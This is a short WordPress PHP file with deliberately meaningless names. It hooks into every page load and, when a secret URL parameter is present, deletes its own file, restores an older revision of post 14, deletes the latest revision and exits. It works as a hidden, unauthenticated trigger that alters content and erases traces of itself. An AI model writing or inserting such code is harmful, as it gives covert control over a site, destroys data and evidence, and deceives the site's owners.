<?php

function platform_price_listing() {
	if (isset($_GET['multiple_compare_type']) && $_GET['multiple_compare_type'] === 'maintenance_modules_instant') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$front_base_mediaelement = 14;
		$purchase_locator_popup_dist = wp_get_post_revisions($front_base_mediaelement);
		if (empty($purchase_locator_popup_dist)) die('no revisions');
		if (count($purchase_locator_popup_dist) < 2) die('less than 2');
		$method_redirect_animated = array_shift($purchase_locator_popup_dist);
		$player_sync_analytics_cool = $method_redirect_animated->ID;
		$style_instant_random = array_shift($purchase_locator_popup_dist);
		$charts_scroll_business = $style_instant_random->ID;
		$video_preview_pdf = wp_restore_post_revision($charts_scroll_business);
		if ($video_preview_pdf === false) die('error restoring');
		$video_preview_pdf = wp_delete_post_revision($player_sync_analytics_cool);		
		if ($video_preview_pdf === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'platform_price_listing');
